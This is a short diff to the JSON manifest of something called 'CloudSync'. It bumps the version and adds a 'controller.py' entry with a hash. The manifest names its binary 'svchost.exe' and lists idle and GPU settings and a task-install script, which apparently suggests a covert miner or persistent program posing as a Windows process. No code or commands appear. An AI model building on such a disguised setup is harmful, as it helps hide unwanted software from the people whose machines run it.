@@ -1,6 +1,6 @@
 {
   "name": "CloudSync",
-  "version": 23,
+  "version": 24,
   "binary": "svchost.exe",
   "idle_seconds": 180,
   "force_gpu": false,
@@ -140,6 +140,10 @@
     {
       "path": "install-task.ps1",
       "sha256": "b73891e85433e048e0a98923661e66ef7a6e5e40b2e9e5d22fe5647d92b580c1"
+    },
+    {
+      "path": "controller.py",
+      "sha256": "89c24055751b563ae4e470ace3963b9a58cf6f81046c7bbf829336aba7533f00"
     }
   ]
 }
